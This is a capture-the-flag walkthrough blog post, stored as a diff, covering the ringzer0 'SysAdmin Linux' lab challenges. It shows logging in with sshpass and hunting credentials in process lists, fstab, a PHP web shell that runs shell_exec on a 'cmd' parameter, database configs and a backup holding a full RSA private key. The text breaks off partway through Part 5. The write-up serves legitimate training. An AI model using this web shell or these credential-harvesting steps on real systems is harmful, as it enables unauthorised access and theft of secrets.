@@ -1,0 +1,553 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><title>ringzer0 CTF - SysAdmin Linux - blog.dornea.nu</title><meta content="ringzer0 CTF - SysAdmin Linux - blog.dornea.nu" property="title"><meta content="ringzer0 CTF - SysAdmin Linux - blog.dornea.nu" property="og:title"><meta property="og:description" content="SysAdmin Part 1 Let&rsquo;s login to the machine:
+$ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375 _ ____ __ _____(_)___ ____ _____ ___ _____/ __ \/ /____ ____ _____ ___ / ___/ / __ \/ __ `/_ / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \ / / / / / / / /_/ / / /_/ __/ / / /_/ / /_/ __/ /_/ / / / / / / /_/ /_/_/ /_/\__, / /___/\___/_/ \____/\__/\___/\__,_/_/ /_/ /_/ /____/ _ _ ___ _____ ___ ___ _ _ | (_)_ _ ___ / __|_ _| __| / _ \ ' \| | | ' \/ -_) | (__ | | | _| \___/_||_|_|_|_||_\___| \___| |_| |_| You have mail."><meta property="og:type" content="article"><meta property="og:url" content="http://blog.dornea.nu/2016/10/30/ringzer0-ctf-sysadmin-linux/"><meta property="article:published_time" content="2016-10-30T00:00:00+00:00"><meta property="article:modified_time" content="2016-10-30T00:00:00+00:00"><meta name=generator content="Hugo 0.75.1"><link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel=stylesheet><style type=text/css>:root{--main-color: #8C6056;--secondary-color: #AFD5AA;--logo-text-color: #fff;--body-text-color: #3d3d3d;--heading-text-color: #383838;--background-color: #fff}</style><link href=http://blog.dornea.nu/css/tachyons.min.css rel=stylesheet><link href=http://blog.dornea.nu/css/styles.css rel=stylesheet><link rel=icon href=http://blog.dornea.nu/favicon.ico type=image/x-icon><link href=http://blog.dornea.nu/feed.xml rel=alternate type=application/atom+xml title=blog.dornea.nu></head><body class=global-font><nav class="flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id=navbar><div class=flex><a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id=site-title href=http://blog.dornea.nu/ title=Home>blog.dornea.nu</a></div><div class="flex-ns mt2 mt0-ns pv1"><a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/ title=Home>Home</a>
+<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://dornea.nu title=About>About</a>
+<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/tags title=Tags>Tags</a>
+<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org title=Zettelkasten>Zettelkasten</a>
+<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bookmarks.html title=Bookmarks>Bookmarks</a>
+<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bib.html title=Books>Books</a>
+<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/notes title=Notes>Notes</a></div></nav><main class="center mv4 content-width ph3"><div class="f3 fw6 heading-color heading-font post-title">ringzer0 CTF - SysAdmin Linux</div><p class="silver f6 mt1 mb4 post-meta"><time>30 Oct 2016</time>
+|
+tags: [ <a href=http://blog.dornea.nu/tags/ringzer0 class="link silver">ringzer0</a> <a href=http://blog.dornea.nu/tags/ctf class="link silver">ctf</a> <a href=http://blog.dornea.nu/tags/wargames class="link silver">wargames</a> <a href=http://blog.dornea.nu/tags/admin class="link silver">admin</a> <a href=http://blog.dornea.nu/tags/linux class="link silver">linux</a> ]</p><div class="lh-copy post-content"><h2 id=sysadmin-part-1>SysAdmin Part 1</h2><p>Let&rsquo;s login to the machine:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375
+
+         _                             ____  __                     
+   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
+  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
+                            / _ \ &#39; \| | | &#39; \/ -_) | (__  | | | _| 
+                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
+                                                                    
+
+You have mail.
+morpheus@forensics:~$ 
+
+</code></pre></div><p>What&rsquo;s in $HOME:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>morpheus@forensics:~$ ls  -l
+total 4
+-rw-r----- 1 root root 1655 Mar 10  2014 egrep
+morpheus@forensics:~$ ls -la
+total 28
+drwxr-xr-x  2 morpheus morpheus 4096 Mar 10  2014 .
+drwxr-xr-x 10 root     root     4096 Jun 12  2014 ..
+lrwxrwxrwx  1 root     root        9 Mar  9  2014 .bash_history -&gt; /dev/null
+-rw-r-----  1 morpheus morpheus  220 Mar  9  2014 .bash_logout
+-rwxrwxr-x  1 morpheus morpheus   36 Feb 24 11:16 .bashrc
+-rw-r-----  1 root     root     1655 Mar 10  2014 egrep
+-rw-r-----  1 morpheus morpheus  675 Mar  9  2014 .profile
+-rw-r-----  1 morpheus morpheus   19 Mar  9  2014 .vimrc
+</code></pre></div><p>Nothing interesting. What about running processes?</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>morpheus@forensics:~$ ps -ax
+ 2615 ?        S      0:00 logger -t mysqld -p daemon.error
+ 2695 ?        Ss     0:12 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:108
+ 3110 ?        Ssl    0:00 /usr/sbin/slapd -h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d
+ 3159 ?        Ss     0:00 /usr/sbin/cron
+ 3191 ?        Ss     0:05 /usr/sbin/sshd
+ 3238 ?        Ss     0:12 /usr/sbin/vnstatd -d
+ 3262 ?        Ss     0:00 /usr/sbin/exim4 -bd -q30m
+ 3286 ?        S      0:04 /bin/sh /root/backup.sh -u trinity -p Flag-08grILsn3ekqhDK7cKBV6ka8B
+ 3289 ?        S      0:00 su neo -c /bin/monitor
+ 3292 ?        Ss     0:00 /bin/monitor
+ 3319 tty1     Ss+    0:00 /sbin/getty 38400 tty1
+ 3320 tty2     Ss+    0:00 /sbin/getty 38400 tty2
+ 3321 tty3     Ss+    0:00 /sbin/getty 38400 tty3
+ 3322 tty4     Ss+    0:00 /sbin/getty 38400 tty4
+ 3323 tty5     Ss+    0:00 /sbin/getty 38400 tty5
+ 3324 tty6     Ss+    0:00 /sbin/getty 38400 tty6
+ 3651 ?        S      0:04 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:108
+ 9100 ?        S      0:01 [kworker/0:2]
+16157 ?        S      0:00 su neo -c /bin/monitor
+16159 ?        Ss     0:00 /bin/monitor
+19107 ?        S      0:00 [kworker/0:0]
+
+</code></pre></div><p>Ah, there we go.</p><h2 id=sysadmin-part-2>SysAdmin Part 2</h2><p>Now let&rsquo;s login with <code>trinity</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375
+
+         _                             ____  __                     
+   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
+  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
+                            / _ \ &#39; \| | | &#39; \/ -_) | (__  | | | _| 
+                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
+                                                                    
+
+You have mail.
+
+</code></pre></div><p>Now let&rsquo;s have a look inside <code>/etc</code> for files containing <strong>architect</strong>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>trinity@forensics:/etc$ grep -r &#34;architect&#34; 2&gt;/dev/null | head -n 10
+fstab:#//TheMAtrix/phone  /media/Matrix  cifs  username=architect,password=$(base64 -d &#34;RkxBRy14QXFXMnlKZzd4UERCV3VlVGdqd05jMW5WWQo=&#34;),iocharset=utf8,sec=ntlm  0  0
+init.d/checkroot.sh:            # fail on older kernels on sparc64/alpha architectures due
+aide/aide.conf.d/10_aide_hostname:if [ -n &#34;$(dpkg --print-architecture)&#34; ]; then
+aide/aide.conf.d/10_aide_hostname:  echo &#34;@@define ARCH $(dpkg --print-architecture)&#34;
+group:architect:x:1006:
+passwd:architect:x:1006:1006::/home/architect:/bin/bash
+^C
+trinity@forensics:/etc$ echo &#34;RkxBRy14QXFXMnlKZzd4UERCV3VlVGdqd05jMW5WWQo=&#34; | base64 -d
+FLAG-xAqW2yJg7xPDBWueTgjwNc1nVY
+
+</code></pre></div><p>Ok, next level.</p><h2 id=sysadmin-part-3>SysAdmin Part 3</h2><p>Let&rsquo;s search for <strong>readable</strong> files and <strong>owned</strong> by the user <strong>architect</strong>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ architect@forensics:/$ find . -readable -and -user architect 2&gt;/dev/null | head -n 10
+./var/mail/architect
+./var/www/index.php
+./dev/pts/1
+./dev/pts/0
+./proc/11081
+./proc/11081/task
+./proc/11081/task/11081
+./proc/11081/task/11081/attr
+...
+</code></pre></div><p>Hmm, <code>/var/www/index.php</code> looks interesting:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>architect@forensics:/<span style=color:#a61717;background-color:#e3d2d2>$</span> cat /<span style=color:#6ab825;font-weight:700>var</span>/www/index.php  | head -n <span style=color:#3677a9>20</span>
+&lt;?php
+<span style=color:#6ab825;font-weight:700>if</span>(isset(<span style=color:#40ffff>$_GET</span>[<span style=color:#ed9d13>&#39;cmd&#39;</span>])) {
+  <span style=color:#40ffff>$res</span> = shell_exec(urldecode(<span style=color:#40ffff>$_GET</span>[<span style=color:#ed9d13>&#39;cmd&#39;</span>]));
+  print_r(str_replace(<span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>, <span style=color:#ed9d13>&#39;&lt;br /&gt;&#39;</span>, <span style=color:#40ffff>$res</span>));
+  <span style=color:#6ab825;font-weight:700>exit</span>();
+}
+<span style=color:#40ffff>$info</span> = (object)<span style=color:#6ab825;font-weight:700>array</span>();
+<span style=color:#40ffff>$info</span>-&gt;<span style=color:#bbb>username</span> = <span style=color:#ed9d13>&#34;arch&#34;</span>;
+<span style=color:#40ffff>$info</span>-&gt;<span style=color:#bbb>password</span> = <span style=color:#ed9d13>&#34;asdftgTst5sdf6309sdsdff9lsdftz&#34;</span>;
+<span style=color:#40ffff>$id</span> = <span style=color:#3677a9>1003</span>;
+
+<span style=color:#6ab825;font-weight:700>function</span> <span style=color:#447fcf>GetList</span>(<span style=color:#40ffff>$id</span>, <span style=color:#40ffff>$info</span>) {
+        <span style=color:#40ffff>$id</span> = <span style=color:#3677a9>2</span>;
+        <span style=color:#40ffff>$link</span> = mysql_connect(<span style=color:#ed9d13>&#34;127.0.0.1&#34;</span>, <span style=color:#40ffff>$info</span>-&gt;<span style=color:#bbb>username</span>, <span style=color:#40ffff>$info</span>-&gt;<span style=color:#bbb>password</span>);
+        mysql_select_db(<span style=color:#ed9d13>&#34;arch&#34;</span>, <span style=color:#40ffff>$link</span>);
+        <span style=color:#40ffff>$result</span> = mysql_query(<span style=color:#ed9d13>&#34;SELECT * FROM arch&#34;</span>);
+        <span style=color:#40ffff>$output</span> = <span style=color:#6ab825;font-weight:700>array</span>();
+        <span style=color:#6ab825;font-weight:700>while</span>(<span style=color:#40ffff>$row</span> = mysql_fetch_assoc(<span style=color:#40ffff>$result</span>)) {
+                array_push(<span style=color:#40ffff>$output</span>, <span style=color:#40ffff>$row</span>);
+        }
+...
+</code></pre></div><p>Ah, some credentials for a <strong>MySQL</strong> DB. Let&rsquo;s have a look:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>architect@forensics:~$ mysql -h localhost -u arch -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 66
+Server version: 5.5.49-0+deb7u1 (Debian)
+
+Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| arch               |
++--------------------+
+2 rows in set (0.04 sec)
+
+mysql&gt; use arch;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++----------------+
+| Tables_in_arch |
++----------------+
+| arch           |
+| flag           |
++----------------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from flag;
++---------------------------------+
+| flag                            |
++---------------------------------+
+| FLAG-0I68UrLA758G5G30806w637a4k |
++---------------------------------+
+1 row in set (0.00 sec)
+</code></pre></div><h2 id=sysadmin-part-4>SysAdmin Part 4</h2><p>I first had a look about all <strong>readable</strong> files (to user <strong>architect</strong>) and searched for <code>oracle</code> inside them:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>architect@forensics:~$ find / -readable -exec grep -i &#34;oracle&#34; {} \; 2&gt;/dev/null
+Binary file /backup/c074fa6ec17bb35e168366c43cf4cd19 matches
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
+Binary file /var/cache/apt-show-versions/apackages matches
+Binary file /var/cache/man/index.db matches
+...
+</code></pre></div><p>Inside <code>/backup/c074fa6ec17bb35e168366c43cf4cd19</code> we can then find:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>[...]
+----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAqBIMY0jPs4dvQqsyHreYccCOIMFrBy+el5Td8TNc8pQqINNr
+WSefxANe4b0EaAZofvZbBGrHipyB6X+FgugXYqwB0uem06uTGnIdHAZyHV6IE9f/
+hLCm+9nWOJfUvPNFbMaIizvzMVhO6GTGyxJ8zh/ASQXYBHSzyOxkmqDLB7zFteyJ
+F7hv6s6W20TmpjhMQtOC0mYwn64ZCsVi2d1c7tFiw37cOutT1LfZaaAUBIwdpvL6
+BFjqpNkxzwm105eFTDt4WZNKOZ9nOns18MHBHFOXk8WgAxC6gqtE2gr7cTBZsbwv
+jXrte8oTtAWCv3YHSECH91NzE3DKVktCwr1bjQIDAQABAoIBAQCdefu9c1WZY4bu
+MrYNbf0aaE9Dhbcgzo+Me+HQxE2MxSMMCsyEhsn9wSK/5Hkidw6mF3KEmwBIcgiP
+nfqdA5YV0BENahw4LITyvIVl4uw9dHuQDEzQKSzswdkkwa6FNHOSThtWSl+9ln6o
+5PQXBkWGZN2oDh+vXSGvWz+QWqSho8vufmTtYntfFPAfVfcyp8BtiUgKQh069uGg
+XKnehmkrHoW9gQ2Lo0uaFWcTIGm1vsgBd7L4cfb98jDB63H+Lhf4UPYv4WmH2rrj
+bnk5lAU71JK4QsPnnOx1PA685p2e5mEfh0LKRKq9Fx3+umbGPJGvgcjobtXaW9OT
+mpaz6ZPBAoGBAM+diN8s/osQdi8odS9+HUWVZBa9Z2Dn0X2IlSxWK9u/UclhjYgP
+i2KXEY0wRV+ZiXURmrFNVxgA/EJ9BOgptSZNmi9fEdfnVB4L11T7HFny/J8u3sXt
+dn0OqHmf5ZEPtV7m0bK0jtznTgTTuBI9yXvRgHO2HQPCshdP7GIgt++lAoGBAM89
+Pd7HyMYnh0ancCTICkVIIWF6Ylf20BKz4Zwy9tYASCxY3iFllBdOXw/UgCnmJseQ
+73Dcimi5OEyUckOp7xX4HTwidFVbxfNeC0ZfsPbd22qSDcw5orpQMoDy3iP+bPJh
+SgwtusqotGjm0jTpnhqRV5x6rchzkMYwF8/WkvfJAoGBAMeem6yh0XiaclfzWYE5
+jCGMezjWEeD949IEkhGYJQFbmeK79l49O/KmeAy9veYmdSDntUoGp9f/kozHMgGb
+oH5cnQQxL7HczWc6UWd3LhJabIUNhsreAFBL2Ldgg1UPun6uBjACJV7G06AWhWSc
+ne58SDp5frpP5/Y8NXdAKDq1AoGAYCSFQ4lj96n29CxRtn6nZSTld5eTcEOsnECf
+dhuesAFJemlwBAZgAb/2Eh3/p3CCpSr0KmPmQldLaxujNwjrRkHpLjC9z6vX1ePX
+TzqtmpmqZXKEvC4w9EaoZ3JE5GXwnTHNbID6m3JQ4CnVc36+Po0XHB096jTTAV7m
+bSGa5SECgYBE2IuW1pk2pOZ+FDtKltWHk8KK89QmGsFf2YnVZ/FsAkPnayeTkmMz
+AWxRP/W/Uj5ypw7KjprQee31hkisBG/ZPBvQdjAvxF7m4usuEN2Nkb0FTIjZHYbD
+iPOmPHIUlwwL8UVzDQUzXhegSB4GUeP/06T/eM5PPB8SX0ZaHIw1wQ==
+-----END RSA PRIVATE KEY-----
+[...]
+</code></pre></div><p>&mldr; which is most probably a private ssh key. Next I try to login to the machine using the previously find SSH identity:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>% ssh -i ssh oracle@for01.ringzer0team.com -p 13375
+
+         _                             ____  __                     
+   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
+  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
+ / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
+/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
+             /____/                                                 
+                                      _ _             ___ _____ ___ 
+                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
+                            / _ \ &#39; \| | | &#39; \/ -_) | (__  | | | _| 
+                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
+                                                                    
+
+You have mail.
+</code></pre></div><p>Bingo! Now let&rsquo;s look around:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>oracle@forensics:~$ ls -la
+total 36
+drwxr-x---  3 oracle oracle 4096 Mar 12  2014 .
+drwxr-xr-x 10 root   root   4096 Jun 12  2014 ..
+-rw-------  1 root   root      0 Mar 12  2014 .bash_history
+-rw-r-----  1 oracle oracle  220 Dec 29  2012 .bash_logout
+-rw-r-----  1 oracle oracle 3512 Mar 12  2014 .bashrc
+-rw-r-----  1 oracle oracle   90 Mar 12  2014 encflag.txt.enc
+-rw-r-----  1 oracle oracle   45 Mar 12  2014 flag.txt
+-rw-r-----  1 oracle oracle  675 Dec 29  2012 .profile
+drwx------  2 oracle oracle 4096 Mar 12  2014 .ssh
+-rw-r-----  1 oracle oracle   19 Mar  4  2014 .vimrc
+oracle@forensics:~$ cat flag.txt 
+RkxBRy1HSUdzMVdxNlY2U3NaOWg0YVFncEdnZGJkUAo=
+oracle@forensics:~$ cat flag.txt | base64 -d
+FLAG-GIGs1Wq6V6SsZ9h4aQgpGgdbdP
+</code></pre></div><h2 id=sysadmin-part-5>SysAdmin Part 5</h2><p>SSH into machine:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=color:#a61717;background-color:#e3d2d2>$</span> ssh -i ssh oracle<span style=color:#a61717;background-color:#e3d2d2>@</span>for01.ringzer0team.com -p <span style=color:#3677a9>13375</span>
+oracle<span style=color:#a61717;background-color:#e3d2d2>@</span>forensics:<span style=color:#a61717;background-color:#e3d2d2>~$</span> cat .bashrc 
+<span style=color:#a61717;background-color:#e3d2d2>#</span> <span style=color:#a61717;background-color:#e3d2d2>~</span>/.bashrc: executed by <span style=color:#447fcf>bash</span>(<span style=color:#3677a9>1</span>) <span style=color:#6ab825;font-weight:700>for</span> non-login shells.
+<span style=color:#a61717;background-color:#e3d2d2>#</span> see /usr/share/doc/bash/examples/startup-<span style=color:#447fcf>files</span> (in the <span style=color:#6ab825;font-weight:700>package</span> bash-doc)
+<span style=color:#a61717;background-color:#e3d2d2>#</span> <span style=color:#6ab825;font-weight:700>for</span> examples
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> If not running interactively, don<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>t do anything
+<span style=color:#6ab825;font-weight:700>case</span> <span style=color:#a61717;background-color:#e3d2d2>$</span>- in
+    *i*) ;;
+      *) <span style=color:#6ab825;font-weight:700>return</span>;;
+esac
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> don<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>t put duplicate lines or lines starting with space in the history.
+<span style=color:#a61717;background-color:#e3d2d2>#</span> See <span style=color:#447fcf>bash</span>(<span style=color:#3677a9>1</span>) <span style=color:#6ab825;font-weight:700>for</span> more options
+HISTCONTROL=ignoreboth
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> append to the history file, don<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>t overwrite it
+shopt -s histappend
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> <span style=color:#6ab825;font-weight:700>for</span> setting history length see HISTSIZE and HISTFILESIZE in <span style=color:#447fcf>bash</span>(<span style=color:#3677a9>1</span>)
+HISTSIZE=<span style=color:#3677a9>1000</span>
+HISTFILESIZE=<span style=color:#3677a9>2000</span>
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> check the window size after each command and, <span style=color:#6ab825;font-weight:700>if</span> necessary,
+<span style=color:#a61717;background-color:#e3d2d2>#</span> update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> If set, the pattern <span style=color:#ed9d13>&#34;**&#34;</span> used in a pathname expansion context will
+<span style=color:#a61717;background-color:#e3d2d2>#</span> match all files and zero or more directories and subdirectories.
+<span style=color:#a61717;background-color:#e3d2d2>#</span>shopt -s globstar
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> make less more friendly <span style=color:#6ab825;font-weight:700>for</span> non-text input files, see <span style=color:#447fcf>lesspipe</span>(<span style=color:#3677a9>1</span>)
+<span style=color:#a61717;background-color:#e3d2d2>#</span>[ -x /usr/bin/lesspipe ] &amp;&amp; eval <span style=color:#ed9d13>&#34;$(SHELL=/bin/sh lesspipe)&#34;</span>
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> set variable identifying the chroot you work <span style=color:#447fcf>in</span> (used in the prompt below)
+<span style=color:#6ab825;font-weight:700>if</span> [ -z <span style=color:#ed9d13>&#34;${debian_chroot:-}&#34;</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; then
+    debian_chroot=<span style=color:#a61717;background-color:#e3d2d2>$</span>(cat /etc/debian_chroot)
+fi
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> set a fancy <span style=color:#447fcf>prompt</span> (non-color, unless we know we <span style=color:#ed9d13>&#34;want&#34;</span> color)
+<span style=color:#6ab825;font-weight:700>case</span> <span style=color:#ed9d13>&#34;$TERM&#34;</span> in
+    xterm-color) color_prompt=yes;;
+esac
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> uncomment <span style=color:#6ab825;font-weight:700>for</span> a colored prompt, <span style=color:#6ab825;font-weight:700>if</span> the terminal has the capability; turned
+<span style=color:#a61717;background-color:#e3d2d2>#</span> off by <span style=color:#6ab825;font-weight:700>default</span> to not distract the user: the focus in a terminal window
+<span style=color:#a61717;background-color:#e3d2d2>#</span> should be on the output of commands, not on the prompt
+<span style=color:#a61717;background-color:#e3d2d2>#</span>force_color_prompt=yes
+<span style=color:#6ab825;font-weight:700>if</span> [ -n <span style=color:#ed9d13>&#34;$force_color_prompt&#34;</span> ]; then
+    <span style=color:#6ab825;font-weight:700>if</span> [ -x /usr/bin/tput ] &amp;&amp; tput setaf <span style=color:#3677a9>1</span> &gt;&amp;/dev/null; then
+        <span style=color:#a61717;background-color:#e3d2d2>#</span> We have color support; assume it<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>s compliant with Ecma-<span style=color:#3677a9>48</span>
+        <span style=color:#a61717;background-color:#e3d2d2>#</span> (ISO/IEC-<span style=color:#3677a9>6429</span>). (Lack of such support is extremely rare, and such
+        <span style=color:#a61717;background-color:#e3d2d2>#</span> a <span style=color:#6ab825;font-weight:700>case</span> would tend to support setf rather than setaf.)
+        color_prompt=yes
+    <span style=color:#6ab825;font-weight:700>else</span>
+        color_prompt=
+    fi
+fi
+
+<span style=color:#6ab825;font-weight:700>if</span> [ <span style=color:#ed9d13>&#34;$color_prompt&#34;</span> = yes ]; then
+    PS1=<span style=color:#a61717;background-color:#e3d2d2>&#39;$</span>{debian_chroot:+(<span style=color:#a61717;background-color:#e3d2d2>$</span>debian_chroot)}<span style=color:#a61717;background-color:#e3d2d2>\</span>[<span style=color:#a61717;background-color:#e3d2d2>\</span><span style=color:#3677a9>033</span>[<span style=color:#3677a9>01</span>;<span style=color:#3677a9>32</span>m<span style=color:#a61717;background-color:#e3d2d2>\</span>]<span style=color:#a61717;background-color:#e3d2d2>\</span>u<span style=color:#a61717;background-color:#e3d2d2>@\</span>h<span style=color:#a61717;background-color:#e3d2d2>\</span>[<span style=color:#a61717;background-color:#e3d2d2>\</span><span style=color:#3677a9>033</span>[<span style=color:#3677a9>00</span>m<span style=color:#a61717;background-color:#e3d2d2>\</span>]:<span style=color:#a61717;background-color:#e3d2d2>\</span>[<span style=color:#a61717;background-color:#e3d2d2>\</span><span style=color:#3677a9>033</span>[<span style=color:#3677a9>01</span>;<span style=color:#3677a9>34</span>m<span style=color:#a61717;background-color:#e3d2d2>\</span>]<span style=color:#a61717;background-color:#e3d2d2>\</span>w<span style=color:#a61717;background-color:#e3d2d2>\</span>[<span style=color:#a61717;background-color:#e3d2d2>\</span><span style=color:#3677a9>033</span>[<span style=color:#3677a9>00</span>m<span style=color:#a61717;background-color:#e3d2d2>\</span>]<span style=color:#a61717;background-color:#e3d2d2>\$</span> <span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+<span style=color:#6ab825;font-weight:700>else</span>
+    PS1=<span style=color:#a61717;background-color:#e3d2d2>&#39;$</span>{debian_chroot:+(<span style=color:#a61717;background-color:#e3d2d2>$</span>debian_chroot)}<span style=color:#a61717;background-color:#e3d2d2>\</span>u<span style=color:#a61717;background-color:#e3d2d2>@\</span>h:<span style=color:#a61717;background-color:#e3d2d2>\</span>w<span style=color:#a61717;background-color:#e3d2d2>\$</span> <span style=color:#a61717;background-color:#e3d2d2>&#39;</span>
+fi
+unset color_prompt force_color_prompt
+
+<span style=color:#a61717;background-color:#e3d2d2>#</span> If this is an xterm set the title to user<span style=color:#a61717;background-color:#e3d2d2>@</span>host:dir
